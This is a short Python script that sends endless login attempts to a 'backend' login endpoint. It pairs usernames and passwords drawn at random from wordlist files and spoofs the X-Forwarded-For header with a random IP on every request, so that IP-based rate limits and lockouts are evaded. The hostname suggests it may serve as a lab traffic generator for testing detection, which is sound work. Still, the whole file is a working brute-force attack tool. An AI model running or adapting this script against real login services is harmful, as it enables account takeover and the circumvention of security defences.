import random
import time
import requests

TARGET_URL = "http://backend:8000/login"

def load_file(filename):

    with open(filename, "r") as file:

        return [
            line.strip()
            for line in file
            if line.strip()
        ]

USERS = load_file("users.txt")

PASSWORDS = load_file("passwords.txt")

def generate_ip():
    return ".".join(
        str(random.randint(1, 254))
        for _ in range(4)
    )
IP_POOL = [
    generate_ip()
    for _ in range(50)
]

while True:

    payload = {
        "username": random.choice(USERS),
        "password": random.choice(PASSWORDS)
    }

    fake_ip = generate_ip()

    headers = {
        "X-Forwarded-For": fake_ip
    }

    try:

        response = requests.post(
            TARGET_URL,
            json=payload,
            headers=headers,
            timeout=5
        )

        print(
            f"IP={fake_ip} "
            f"User={payload['username']} "
            f"Status={response.status_code}"
        )

    except Exception as e:

        print(
            f"IP={fake_ip} "
            f"Error={e}"
        )

    time.sleep(1)